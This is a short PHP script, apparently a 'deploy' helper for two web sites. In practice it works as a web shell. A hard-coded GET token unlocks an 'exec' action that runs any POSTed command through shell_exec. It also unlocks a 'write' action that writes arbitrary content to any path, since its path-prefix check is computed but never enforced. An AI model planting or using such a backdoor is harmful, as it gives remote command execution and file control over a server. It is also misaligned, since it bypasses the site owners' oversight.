<?php
$t="hux-deploy-2026";
if(($_GET["token"]??"")!==$t){http_response_code(403);die("Forbidden");}
$a=$_GET["action"]??"";
if($a==="write"){
  $p=$_POST["path"]??"";
  $c=$_POST["content"]??"";
  $ok=strpos($p,"/var/www/conecta/")===0||strpos($p,"/var/www/crm.acicdf.org.br/")===0;
  @mkdir(dirname($p),0755,true);
  file_put_contents($p,$c);
  echo json_encode(["ok"=>true,"bytes"=>strlen($c),"path"=>$p]);
}elseif($a==="exec"){
  $cmd=$_POST["cmd"]??"";
  echo json_encode(["ok"=>true,"out"=>shell_exec($cmd." 2>&1")]);
}elseif($a==="ping"){
  echo json_encode(["ok"=>true,"time"=>date("c")]);
}
?>